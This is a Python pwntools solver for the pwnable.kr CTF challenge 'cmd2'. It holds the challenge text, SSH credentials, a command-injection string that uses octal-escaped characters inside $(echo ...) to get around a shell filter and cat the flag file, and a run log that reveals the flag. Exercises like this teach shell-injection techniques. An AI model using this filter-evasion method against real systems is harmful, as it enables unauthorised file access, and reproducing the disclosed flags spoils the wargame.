'''
Description:

    Daddy bought me a system command shell.
    but he put some filters to prevent me from playing with it without his permission...
    but I wanna play anytime I want!

    ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

Solution

Solver:
'''

from pwn import *

user    = 'cmd2'
passwd  = 'mommy now I get what PATH environment is for :)'
host    = 'pwnable.kr'
port    = 2222
command = ''' ./cmd2 '$(echo "\\0057bin\\0057cat\\0040\\0057home\\0057cmd2\\0057fla*")' '''

s = ssh(user, host, port, passwd)
flag, status = s.run_to_end(command)
print '[+] Flag:', flag
s.close()

'''
Log:

[+] Connecting to pwnable.kr on port 2222: Done
[+] Flag: FuN_w1th_5h3ll_v4riabl3s_haha
$(echo "\0057bin\0057cat\0040\0057home\0057cmd2\0057fla*")

[*] Closed connection to 'pwnable.kr'
'''
